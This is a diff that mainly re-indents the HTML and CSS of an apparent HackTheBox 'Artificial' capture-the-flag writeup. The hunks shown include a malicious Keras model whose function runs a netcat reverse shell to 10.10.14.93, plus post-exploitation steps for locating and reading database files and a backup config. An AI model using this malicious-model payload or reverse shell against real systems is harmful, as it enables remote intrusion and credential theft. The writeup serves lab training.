@@ -1,5 +1,4 @@
 <!DOCTYPE html>
-
 <html lang="en-us">
 <head>
 <meta charset="utf-8">
@@ -9,58 +8,57 @@
 <meta name="description" content="HackTheBox Artificial writeup">
 
 <style>
-body {
-background-color: #000000; /* Black background /
-font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-margin: 0;
-padding: 0;
-color: #f7f7f7; / Light text color for contrast /
-}
-main {
-max-width: 900px;
-margin: 0 auto;
-padding: 2rem 1rem;
-background: #1a1a1a; / Darker background for main content /
-box-shadow: 0 4px 12px rgba(0,0,0,0.5);
-}
-h1, h2, h3, h4 {
-margin-top: 2rem;
-color: #f7f7f7;
-}
-pre {
-background: #333333; / Darkish grey for code boxes /
-padding: 1rem;
-overflow-x: auto;
-border-radius: 5px;
-}
-code {
-font-family: monospace;
-color: #39ff14; / neon green default */
-}
-.keyword { color: #ff79c6; }
-.builtin { color: #8be9fd; }
-.string { color: #f1fa8c; }
-.comment { color: #6272a4; font-style: italic; }
-.number { color: #bd93f9; }
-img {
-max-width: 100%;
-display: block;
-margin: 1rem 0;
-}
-a {
-color: #1a73e8;
-text-decoration: none;
-}
-a:hover { text-decoration: underline; }
+    body {
+        background-color: #000000; /* Black background */
+        font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        color: #f7f7f7; /* Light text color for contrast */
+    }
+    main {
+        max-width: 900px;
+        margin: 0 auto;
+        padding: 2rem 1rem;
+        background: #1a1a1a; /* Darker background for main content */
+        box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    }
+    h1, h2, h3, h4 {
+        margin-top: 2rem;
+        color: #f7f7f7;
+    }
+    pre {
+        background: #333333; /* Darkish grey for code boxes */
+        padding: 1rem;
+        overflow-x: auto;
+        border-radius: 5px;
+    }
+    code {
+        font-family: monospace;
+        color: #39ff14; /* neon green default */
+    }
+    .keyword { color: #ff79c6; }
+    .builtin { color: #8be9fd; }
+    .string { color: #f1fa8c; }
+    .comment { color: #6272a4; font-style: italic; }
+    .number { color: #bd93f9; }
+    img {
+        max-width: 100%;
+        display: block;
+        margin: 1rem 0;
+    }
+    a {
+        color: #1a73e8;
+        text-decoration: none;
+    }
+    a:hover { text-decoration: underline; }
 </style>
-
 </head>
 <body>
 
 <header>
-<div style="background: #000; padding: 1rem;">
-<a href="#" style="color: white; font-size: 1.5rem; text-decoration: none;">0xD3f3c7</a>
-</div>
+    <div style="background: #000; padding: 1rem;">
+        <a href="#" style="color: white; font-size: 1.5rem; text-decoration: none;">0xD3f3c7</a>
+    </div>
 </header>
 
 <main>
@@ -115,9 +113,9 @@ Open 10.10.11.74:80</code></pre>
 <pre><code><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf
 
 <span class="keyword">def</span> exploit(x):
-<span class="keyword">import</span> os
-os.system(<span class="string">"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 6666 >/tmp/f"</span>)
-<span class="keyword">return</span> x
+    <span class="keyword">import</span> os
+    os.system(<span class="string">"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.93 6666 >/tmp/f"</span>)
+    <span class="keyword">return</span> x
 
 model = tf.keras.Sequential()
 model.add(tf.keras.layers.Input(shape=(<span class="number">64</span>,)))
@@ -143,7 +141,7 @@ export TERM=xterm</code></pre>
 <h2>Post Exploitation</h2>
 
 <h3>Enumerate .db files</h3>
-<pre><code>find / -name ".db" 2>/dev/null
+<pre><code>find / -name "*.db*" 2>/dev/null
 sqlite3 /home/app/app/instance/users.db</code></pre>
 
 <p>Tables:</p>
@@ -184,18 +182,18 @@ tar -xvf backrest_backup.tar.gz</code></pre>
 <pre><code>cd backrest/.config/backrest
 cat config.json
 {
-"modno": 2,
-"version": 4,
-"instance": "Artificial",
-"auth": {
-"disabled": false,
-"users": [
-{
-"name": "backrest_root",
-"passwordBcrypt": "HASH"
-}
-]
-}
+  "modno": 2,
+  "version": 4,
+  "instance": "Artificial",
+  "auth": {
+    "disabled": false,
+    "users": [
+      {
+        "name": "backrest_root",
+        "passwordBcrypt": "HASH"
+      }
+    ]
+  }
 }
 </code></pre>
 
